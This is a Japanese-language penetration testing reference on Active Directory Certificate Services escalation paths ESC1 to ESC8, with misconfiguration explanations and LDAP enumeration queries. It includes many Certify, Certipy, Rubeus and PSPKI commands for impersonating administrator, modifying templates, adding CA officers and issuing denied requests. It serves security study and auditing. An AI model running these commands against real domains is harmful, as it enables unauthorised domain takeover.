# AD CS ドメイン権限昇格

{{#include ../../../banners/hacktricks-training.md}}


**以下は、次の投稿にある権限昇格手法のセクションをまとめたものです:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)<sup>[[6]](#references)</sup>
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)<sup>[[7]](#references)</sup>
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## 設定ミスのある証明書テンプレート - ESC1

### 説明

### 設定ミスのある証明書テンプレート - ESC1 の解説

- **Enterprise CA によって、低権限ユーザーに登録権限が付与されている。**
- **Manager の承認が不要である。**
- **承認された担当者による署名が不要である。**
- **証明書テンプレートの Security descriptor のアクセス許可が過剰であり、低権限ユーザーが登録権限を取得できる。**
- **証明書テンプレートで、認証を可能にする EKU が定義されている:**
  - Client Authentication (OID 1.3.6.1.5.5.7.3.2)、PKINIT Client Authentication (1.3.6.1.5.2.3.4)、Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2)、Any Purpose (OID 2.5.29.37.0)、または EKU なし (SubCA) などの Extended Key Usage (EKU) 識別子が含まれている。
- **証明書テンプレートで、リクエスト元が Certificate Signing Request (CSR) に subjectAltName を含めることが許可されている:**
  - Active Directory (AD) は、証明書に subjectAltName (SAN) が含まれている場合、ID 検証においてそれを優先します。つまり、CSR で SAN を指定することで、任意のユーザー (例: ドメイン管理者) になりすます証明書を要求できます。リクエスト元が SAN を指定できるかどうかは、証明書テンプレートの AD オブジェクトにある `mspki-certificate-name-flag` プロパティで示されます。このプロパティはビットマスクであり、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` フラグが含まれていれば、リクエスト元による SAN の指定が許可されます。

> [!CAUTION]
> これらの設定は ESC1 テンプレートの候補を特定するものであり、なりすましが可能な状態を証明するものではありません。対象の principal が、そのテンプレートを公開している CA で登録できること、CA で証明書の登録が許可されていること、発行された証明書が認証エンドポイントの強力な SID マッピングルールを満たすことを確認してください。現在のパッチ適用済み KDC は、証明書の SID が対象と一致しない場合、要求された UPN を拒否することがあります。詳しくは[Microsoft の証明書マッピングに関するガイダンス](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)を参照してください。

**Domain Computers** に登録権限が付与されている場合、元のユーザーが登録できなくても、準備したコンピューター ID が登録可能なことがあります。コンピューター principal の権限は個別に評価してください。要求を行う前に `msPKI-Minimal-Key-Size` を確認してください。4096-bit RSA key を要求するテンプレートでは、クライアントのデフォルトである 2048-bit key は拒否されます。要求に対象の SID を指定すれば SID の不一致に対処できる場合がありますが、それは CA と KDC が生成された証明書とマッピングを受け入れる場合に限られます。テンプレートのフラグや Enroll ACE だけでは、それが可能だとは判断できません。

この機能は、製品やデプロイサービスによる HTTPS 証明書またはホスト証明書のオンデマンド生成をサポートするため、または理解不足のために有効化されていることがあります。

このオプションを使用して証明書を作成すると警告が表示されます。一方、既存の証明書テンプレート (たとえば、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` が有効になっている `WebServer` テンプレート) を複製し、認証 OID を含めるように変更した場合は、警告が表示されません。<sup>[[6]](#references)</sup>

### 悪用

**脆弱な証明書テンプレートを見つける**には、次のコマンドを実行します:

```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```

**この脆弱性を悪用して管理者になりすますには**、次を実行します:

```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
  /url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
  -template 'ESC1' -upn 'administrator@corp.local'
```

その後、生成された**証明書を`.pfx`形式に変換**し、再び**Rubeusまたはcertipyを使用して認証**できます:<sup>[[5]](#references)</sup>

```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```

Windowsのバイナリ「Certreq.exe」と「Certutil.exe」を使ってPFXを生成できます：https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forestの構成スキーマ内にある証明書テンプレートのうち、承認や署名が不要で、Client AuthenticationまたはSmart Card Logon EKUを持ち、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`フラグが有効なものは、次のLDAPクエリを実行して列挙できます：

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```

## Misconfigured Certificate Templates - ESC2

### 説明

2つ目の悪用シナリオは、1つ目のバリエーションです。

1. Enterprise CA によって、低権限ユーザーに登録権限が付与されている。
2. manager approval の要件が無効になっている。
3. authorized signatures の要件が省略されている。
4. 証明書テンプレートの過度に寛容なセキュリティ記述子によって、低権限ユーザーに証明書の登録権限が付与されている。
5. **証明書テンプレートに Any Purpose EKU または EKU なしが定義されている。**

**Any Purpose EKU** を使用すると、攻撃者はクライアント認証、サーバー認証、コード署名など、**あらゆる目的**で証明書を取得できます。このシナリオの悪用には、**ESC3 で使用される手法**を利用できます。

下位 CA 証明書として機能する **EKU なしの証明書**は、**あらゆる目的**に悪用でき、**新しい証明書への署名にも使用できます**。そのため、攻撃者は下位 CA 証明書を利用して、新しい証明書に任意の EKU やフィールドを指定できます。

ただし、下位 CA が **`NTAuthCertificates`** オブジェクトによって信頼されていない場合（デフォルト設定）、**ドメイン認証**用に作成された新しい証明書は機能しません。それでも攻撃者は、**任意の EKU** と任意の証明書値を持つ**新しい証明書を作成**できます。これらは幅広い目的（コード署名、サーバー認証など）に**悪用**される可能性があり、SAML、AD FS、IPSec など、ネットワーク内の他のアプリケーションに重大な影響を及ぼす可能性があります。<sup>[[6]](#references)</sup>

AD Forest の構成スキーマ内でこのシナリオに該当するテンプレートを列挙するには、次の LDAP クエリを実行します。

```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```

## 誤設定された Enrollment Agent テンプレート - ESC3

### 説明

このシナリオは最初と2番目のシナリオに似ていますが、**別の EKU**（Certificate Request Agent）と**2つの異なるテンプレート**を悪用します（そのため、要件も2組あります）。

**Certificate Request Agent EKU**（OID 1.3.6.1.4.1.311.20.2.1）は、Microsoft のドキュメントでは **Enrollment Agent** と呼ばれ、プリンシパルが別のユーザーに代わって**証明書**を**登録**できるようにします。

**「Enrollment Agent」**は、このような**テンプレート**で登録し、取得した**証明書を使用して別のユーザーに代わって CSR に共同署名します**。次に、**共同署名済み CSR**を CA に**送信**し、「on behalf of」での登録を**許可するテンプレート**で登録します。すると CA は「別の」ユーザーに属する証明書を返します。<sup>[[6]](#references)</sup>

**要件 1:**

- Enterprise CA により、低権限ユーザーに登録権限が付与されている。
- マネージャーの承認が不要である。
- 承認済み署名が不要である。
- 証明書テンプレートのセキュリティ記述子の権限設定が過剰に寛容で、低権限ユーザーに登録権限を付与している。
- 証明書テンプレートに Certificate Request Agent EKU が含まれており、他のプリンシパルに代わって別の証明書テンプレートを要求できる。

**要件 2:**

- Enterprise CA により、低権限ユーザーに登録権限が付与されている。
- マネージャーの承認が回避されている。
- バージョン 1 の対象テンプレートでは、新しい詳細な発行ポリシー制御がなくても Enrollment Agent を受け入れる場合があります。バージョン 2 以降では、バージョンだけを理由にテンプレートを除外せず、アプリケーションポリシーの発行要件と承認済み署名を確認してください。
- 証明書テンプレートで定義された EKU により、ドメイン認証が可能である。
- CA で Enrollment Agent の制限が適用されていない。

対象テンプレートは、選択した CA によって公開され、対象アカウントに登録が許可されており、想定するドメイン認証用途に対応している必要があります。そのアカウントに必要な subject/SAN 属性があるか確認してください。たとえば、AD から subject email を生成するテンプレートでは、必要な `mail` 値がないアカウントに証明書を発行できません。Enrollment Agent の証明書だけでは、これらの対象テンプレートの条件を満たしません。

### 悪用

[**Certify**](https://github.com/GhostPack/Certify) または [**Certipy**](https://github.com/ly4k/Certipy) を使用して、このシナリオを悪用できます。<sup>[[4]](#references)</sup>

```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```

**登録エージェント証明書**の**取得**が許可される**ユーザー**、登録**エージェント**が登録できるテンプレート、および登録エージェントが代理で操作できる**アカウント**は、エンタープライズ CA によって制限できます。これは、`certsrc.msc` **スナップイン**を開き、**CA を右クリック**して**プロパティをクリック**し、「登録エージェント」タブに**移動**することで設定できます。

ただし、CA の**既定**の設定は「**登録エージェントを制限しない**」です。管理者が登録エージェントの制限を有効にし、「登録エージェントを制限する」に設定した場合でも、既定の構成は依然として非常に寛容です。これにより、**Everyone** がすべてのテンプレートで、任意のユーザーとして登録することを許可されます。

### Certi-Bhai を使った Windows 専用 PowerShell PoC

[**Certi-Bhai**](https://github.com/incredibleindishell/Certi-Bhai) は、Certify や Certipy を使わずに ESC1 と ESC2/ESC3 を実行します。そのスクリプトは、`X509Enrollment` COM API を使用してエクスポート可能な 2048 ビット RSA キーを作成し、PKCS#10 リクエストを構築し、LDAP 経由で最初の `pKIEnrollmentService` を検出して、`CertificateAuthority.Request` 経由で送信し、応答を `Cert:\CurrentUser\My` にインストールしたうえで、Base64 エンコードされた PFX をエクスポートします。ESC1 スクリプトは、攻撃者が選択した UPN SAN（`XCN_CERT_ALT_NAME_USER_PRINCIPLE_NAME`、値 `0xb`）を追加します。一方、ESC2/ESC3 スクリプトは、最初の証明書を使って、代理でのリクエスト用の PKCS#7 に署名します。<sup>[[27]](#references)</sup>

```powershell
# ESC1: supply the identity in the subject and UPN SAN
.\ESC1\esc1.ps1 -subjectName "CN=Administrator,CN=Users,DC=corp,DC=local" `
  -altName "administrator@corp.local" -templateName "VulnESC1" -pfxPass "PfxPass!"

# ESC2/ESC3: obtain an agent-capable certificate, then enroll for the target
.\ESC3\esc3_working.ps1 -templateName "VulnEnrollmentAgent" `
  -target_user "administrator" -domain "CORP" -pfxPass "PfxPass!"
```

スクリプトは、Rubeusで直接使用できるよう、秘密鍵を含む**PFX**のBase64を出力します。[Convert]::ToBase64String($cert.RawData)に置き換えないでください。`RawData`でエンコードされるのは公開証明書のみであり、PKINITリクエストへの署名には使用できません。<sup>[[5]](#references)[[27]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:administrator /certificate:<BASE64_PFX> /password:PfxPass! /nowrap
```

## 脆弱な証明書テンプレートのアクセス制御 - ESC4

### **説明**

**証明書テンプレート**上の**セキュリティ記述子**は、そのテンプレートに対して各**AD プリンシパル**が持つ**権限**を定義します。

**攻撃者**が**テンプレート**を**変更**するために必要な**権限**を持ち、**前のセクション**で説明した**悪用可能な設定ミス**を導入できる場合、権限昇格につながる可能性があります。

証明書テンプレートに関係する主な権限は次のとおりです:<sup>[[6]](#references)</sup>

- **Owner:** オブジェクトに対する暗黙の制御権を付与し、任意の属性を変更できるようにします。
- **FullControl:** 任意の属性の変更を含め、オブジェクトに対する完全な権限を付与します。
- **WriteOwner:** オブジェクトの所有者を、攻撃者が制御するプリンシパルに変更できます。
- **WriteDacl:** アクセス制御を変更できるため、攻撃者に FullControl を付与できる可能性があります。
- **WriteProperty:** オブジェクトの任意のプロパティを編集できます。

`CN=Certificate Templates,CN=Public Key Services,CN=Services,...` コンテナーの DACL も確認してください。[`pKICertificateTemplate` クラス](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adsc/db4b45f7-e57a-4ae1-9b8f-1b107b69d98c)を対象とする適用可能な `CreateChild` ACE、または広範な FullControl があれば、新しいテンプレートオブジェクトを作成できる可能性があります。[Microsoft のドキュメント](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wcce/9279abb2-3dfa-4631-845c-43c187ac4b44)によると、このコンテナーにはこれらのテンプレートオブジェクトが格納されています。作成が実際に可能か判断する前に、該当する deny ACE と継承を確認してください。テンプレートを作成しただけでは証明書は発行されません。CA がそのテンプレートを公開し、要求するプリンシパルに登録アクセス権があり、認証エンドポイントで証明書が意図した ID にマッピングされる必要があります。

### 悪用

テンプレートやその他の PKI オブジェクトに対する編集権限を持つプリンシパルを特定するには、Certify で列挙します:

```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```

前の例のような privesc：

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4は、ユーザーが証明書テンプレートに対する書き込み権限を持つ状態です。たとえば、証明書テンプレートの設定を上書きし、ESC1に脆弱なテンプレートにすることで悪用できます。

登録者がサブジェクトを指定できても、用途が Server Authentication のみのテンプレートは、それだけではユーザーログオン用テンプレートではありません。テンプレートを制御する有効な権限があれば、攻撃者は証明書を要求する前に認証 EKU やアプリケーションポリシーを変更できます。[Microsoftのドキュメントでは、Smartcard Logon EKUのサインイン用途について説明されています](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts)。CAが変更後のテンプレートを公開していること、要求者に登録権限があること、承認や署名の要件を満たしていること、発行された証明書が意図したアカウントにマッピングされることを確認してください。特に、[Full Enforcementが適用されたパッチ済みドメインコントローラー](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers)は、強力なマッピングのない証明書を拒否します。要求にターゲットのUPNを追加しても、この要件は回避できません。

上のパスからわかるように、これらの権限を持つのは`JOHNPC`だけですが、ユーザー`JOHN`には`JOHNPC`への新しい`AddKeyCredentialLink`エッジがあります。この手法は証明書に関連しているため、この攻撃も実装しました。この攻撃は[Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)として知られています。<sup>[[8]](#references)</sup>以下は、被害者のNT hashを取得するCertipyの`shadow auto`コマンドの簡単な紹介です。

```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```

**Certipy**は、1つのコマンドで証明書テンプレートの設定を上書きできます。**デフォルト**では、Certipyは設定を上書きし、**ESC1に脆弱な状態**にします。また、**`-save-old`パラメータを指定して古い設定を保存**することもできます。これは攻撃後に設定を**復元**する際に役立ちます。

```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```

## 脆弱なPKIオブジェクトのアクセス制御 - ESC5

### 説明

証明書テンプレートや証明機関以外の複数のオブジェクトも含む、相互に関連したACLベースの関係の広範なネットワークは、AD CSシステム全体のセキュリティに影響を及ぼす可能性があります。セキュリティに重大な影響を与えうるオブジェクトには、次のものがあります。

- S4U2SelfやS4U2Proxyなどの仕組みによって侵害される可能性がある、CAサーバーのADコンピューターオブジェクト。
- CAサーバーのRPC/DCOMサーバー。
- 特定のコンテナパス `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 内にある、あらゆる子孫ADオブジェクトまたはコンテナ。このパスには、証明書テンプレートコンテナ、証明機関コンテナ、NTAuthCertificatesオブジェクト、Enrollment Servicesコンテナなどが含まれますが、これらに限定されません。

低権限の攻撃者がこれらの重要なコンポーネントのいずれかを制御できた場合、PKIシステムのセキュリティが侵害される可能性があります。<sup>[[6]](#references)</sup>

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 説明

[**CQure Academyの投稿**](https://cqureacademy.com/blog/enhanced-key-usage)では、Microsoftが説明している**`EDITF_ATTRIBUTESUBJECTALTNAME2`**フラグの影響についても取り上げています。この設定を証明機関（CA）で有効にすると、Active Directory®から作成された要求も含め、**あらゆる要求**の**サブジェクト代替名**に**ユーザー定義の値**を含められるようになります。その結果、攻撃者は、標準のUserテンプレートのように**非特権**ユーザーによる登録が許可されている、ドメイン**認証**用の**任意のテンプレート**を使って登録できます。これにより証明書を取得し、ドメイン管理者やドメイン内の**有効な任意の主体**として認証できるようになります。<sup>[[9]](#references)</sup>

**注**: `certreq.exe`の`-attrib "SAN:"`引数（「Name Value Pairs」と呼ばれる）を使って、証明書署名要求（CSR）に**代替名**を追加する方法は、ESC1におけるSANの悪用手法とは**異なります**。違いは、**アカウント情報が格納される方法**にあります。ここでは拡張ではなく、証明書属性に格納されます。

### 悪用

この設定が有効かどうかを確認するには、次のコマンドを`certutil.exe`で実行します。

```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```

この操作は本質的に**リモートレジストリアクセス**を使用するため、別のアプローチとして次の方法が考えられます:

```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

[**Certify**](https://github.com/GhostPack/Certify) や [**Certipy**](https://github.com/ly4k/Certipy) などのツールは、この設定ミスを検出して悪用できます:<sup>[[4]](#references)</sup>

```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```

これらの設定を変更するには、**ドメイン管理者**権限または同等の権限を持っていれば、任意のワークステーションから次のコマンドを実行できます。

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```

環境内でこの設定を無効にするには、次のコマンドでフラグを削除できます:

```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```

> [!WARNING]
> 2022年5月のセキュリティ更新プログラム適用後に新規発行された**証明書**には、**要求者の `objectSid` プロパティ**を組み込んだ**セキュリティ拡張**が含まれます。ESC1では、このSIDは指定されたSANから導出されます。ただし、**ESC6**では、SIDはSANではなく、**要求者の `objectSid`**を反映します。\
> ESC6を悪用するには、SANよりも新しいセキュリティ拡張を優先するESC10（Weak Certificate Mappings）に対してシステムが脆弱であることが不可欠です。

## Vulnerable Certificate Authority Access Control - ESC7

### Attack 1

#### Explanation

証明機関のアクセス制御は、CAの操作を制御する一連のアクセス許可によって維持されます。これらのアクセス許可は、`certsrv.msc`を開き、CAを右クリックして［プロパティ］を選択し、［セキュリティ］タブに移動すると確認できます。また、PSPKI moduleを使用して、次のようなコマンドでアクセス許可を列挙することもできます。

```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```

これは、主な権限である **`ManageCA`** と **`ManageCertificates`** が、それぞれ「CA administrator」と「Certificate Manager」の役割に対応することを示しています。<sup>[[6]](#references)</sup>

#### 悪用

証明機関に対する **`ManageCA`** 権限があると、PSPKIを使用してリモートから設定を変更できます。これには、**`EDITF_ATTRIBUTESUBJECTALTNAME2`** フラグを有効にして、任意のテンプレートでSANの指定を許可することが含まれます。これはドメイン昇格において重要な要素です。

PSPKIの **Enable-PolicyModuleFlag** cmdletを使えば、このプロセスを簡略化でき、GUIを直接操作せずに変更を加えられます。

**`ManageCertificates`** 権限があれば、保留中のリクエストを承認でき、「CA certificate manager approval」というセーフガードを実質的に回避できます。

**Certify** と **PSPKI** のモジュールを組み合わせると、証明書のリクエスト、承認、ダウンロードを実行できます。

```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```

### Attack 2

#### Explanation

> [!WARNING]
> **previous attack** では **`Manage CA`** 権限を使用して **EDITF_ATTRIBUTESUBJECTALTNAME2** フラグを **有効化**し、**ESC6 attack** を実行しましたが、CA サービス（`CertSvc`）が再起動されるまでは効果がありません。ユーザーが `Manage CA` アクセス権を持つ場合、そのユーザーには **サービスを再起動する**権限もあります。ただし、**リモートからサービスを再起動できる**という意味ではありません。さらに、2022年5月のセキュリティ更新プログラムの影響により、ほとんどのパッチ適用済み環境では、E**SC6 はそのままでは動作しない可能性があります**。

そこで、別の攻撃をここで紹介します。

前提条件:

- **`ManageCA` 権限**のみ
- **`Manage Certificates`** 権限（**`ManageCA`** から付与可能）
- 証明書テンプレート **`SubCA`** が**有効**であること（**`ManageCA`** から有効化可能）

この手法は、`Manage CA` **および** `Manage Certificates` アクセス権を持つユーザーが、**失敗した証明書要求を発行できる**という事実を利用します。**`SubCA`** 証明書テンプレートは **ESC1 に対して脆弱**ですが、テンプレートに登録できるのは**管理者のみ**です。そのため、**ユーザー**は **`SubCA`** への登録を**要求**できます。その要求は**拒否**されますが、**その後、管理者によって発行されます**。<sup>[[6]](#references)</sup>

#### Abuse

自分のユーザーを新しい officer として追加することで、自分に **`Manage Certificates`** アクセス権を**付与できます**。

```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```

**`SubCA`** templateは、`-enable-template`パラメーターを使ってCAで**有効化**できます。デフォルトでは、`SubCA` templateは有効になっています。

```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```

この攻撃の前提条件を満たしている場合、まず **`SubCA` テンプレートに基づく証明書を要求**できます。

このリクエストは拒否され**ます**が、秘密鍵を保存し、リクエスト ID を控えておきます。

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```

**`Manage CA` と `Manage Certificates`** があれば、`ca` コマンドと `-issue-request <request ID>` パラメーターを使って、失敗した証明書要求を発行できます。

```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

最後に、`req` コマンドと `-retrieve <request ID>` パラメーターを使って、**発行された証明書を取得**できます。

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### Explanation

従来の ESC7 abuse（EDITF attributes の有効化や、保留中のリクエストの承認）に加えて、**Certify 2.0** により、Enterprise CA の *Manage Certificates*（別名 **Certificate Manager / Officer**）ロールだけで実行できる、まったく新しい primitive が明らかになりました。<sup>[[3]](#references)</sup>

`ICertAdmin::SetExtension` RPC method は、*Manage Certificates* を持つ任意の principal が実行できます。この method は従来、正規の CA が**保留中**のリクエストの extensions を更新するために使用していましたが、攻撃者はこれを悪用して、承認待ちのリクエストに**デフォルト以外の certificate extension**（たとえば `1.1.1.1` のようなカスタム *Certificate Issuance Policy* OID）を**追加**できます。

対象の template でその extension のデフォルト値が**定義されていない**ため、リクエストが最終的に発行されても、CA は攻撃者が制御する値を上書きしません。そのため、発行された certificate には攻撃者が選んだ extension が含まれ、次のような悪用が可能です。

* 他の脆弱な templates の Application / Issuance Policy 要件を満たす（権限昇格につながる）。
* 追加の EKUs や policies を注入し、サードパーティシステムで certificate に予期しない trust を与える。

つまり、これまで ESC7 の「権限が弱い方」と見なされていた *Manage Certificates* を、CA の設定変更や、より制限の厳しい *Manage CA* 権限なしで、完全な権限昇格や長期的な persistence に利用できるようになりました。

#### Certify 2.0 でこの primitive を悪用する

1. **保留状態になる certificate request を送信します。** manager approval が必要な template を使えば、この状態を強制できます。
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **新しい `manage-ca` コマンドを使用して、保留中のリクエストにカスタム拡張を追加します**:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *テンプレートに *Certificate Issuance Policies* 拡張機能がすでに定義されていない場合、上記の値は発行後も保持されます。*

3. **リクエストを発行する**（自分のロールに *Manage Certificates* の承認権限もある場合）か、オペレーターが承認するまで待ちます。発行されたら、証明書をダウンロードします。
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. 生成された証明書には悪意のある発行ポリシー OID が含まれており、その後の攻撃（ESC13、domain escalation など）に使用できます。

> NOTE: Certipy ≥ 4.7 では、`ca` コマンドと `-set-extension` パラメーターを使用して、同じ攻撃を実行できます。

## AD CS HTTP Endpoint への NTLM Relay – ESC8

### 説明

> [!TIP]
> **AD CS がインストールされている**環境で、脆弱な**web enrollment endpoint**が存在し、**ドメインコンピューターによる登録と client authentication を許可する証明書テンプレート**（既定の **`Machine`** テンプレートなど）が少なくとも 1 つ公開されている場合、spooler サービスが有効なコンピューターは、いずれも攻撃者による侵害が可能になります。

AD CS は、管理者が追加のサーバーロールとしてインストールできる、いくつかの **HTTP ベースの登録方式**に対応しています。これらの HTTP ベースの証明書登録インターフェースは、**NTLM relay attacks** に対して脆弱です。攻撃者は、**侵害したマシンから、受信 NTLM 認証を行う任意の AD アカウントになりすますことができます**。被害アカウントになりすましている間、攻撃者はこれらの web インターフェースにアクセスし、`User` または `Machine` 証明書テンプレートを使用して **client authentication certificate を要求**できます。

- **web enrollment interface**（`http://<caserver>/certsrv/` で利用できる古い ASP アプリケーション）は、既定では HTTP のみを使用するため、NTLM relay attacks に対する保護がありません。また、Authorization HTTP header で NTLM 認証のみを明示的に許可しているため、Kerberos などのより安全な認証方式は使用できません。
- **Certificate Enrollment Service**（CES）、**Certificate Enrollment Policy**（CEP）Web Service、および **Network Device Enrollment Service**（NDES）は、既定で Authorization HTTP header を介した negotiate 認証に対応しています。negotiate 認証は Kerberos と **NTLM の両方に対応**しているため、攻撃者は relay attacks の実行中に認証方式を **NTLM にダウングレード**できます。これらの web service は既定で HTTPS を有効にしていますが、HTTPS だけでは **NTLM relay attacks を防げません**。HTTPS service に対する NTLM relay attacks を防ぐには、HTTPS と channel binding を組み合わせる必要があります。しかし残念ながら、AD CS は channel binding に必要な Extended Protection for Authentication を IIS で有効にしていません。<sup>[[6]](#references)</sup>

NTLM relay attacks に共通する**問題**は、NTLM セッションの**有効期間が短い**ことと、**NTLM signing を必要とする**サービスと攻撃者がやり取りできないことです。

しかし、NTLM relay attack を悪用してユーザーの証明書を取得すれば、この制限を回避できます。セッションの有効期間は証明書の有効期間によって決まり、証明書は **NTLM signing を必須とする**サービスでも使用できます。盗んだ証明書の使用方法については、以下を参照してください。


{{#ref}}
account-persistence.md
{{#endref}}

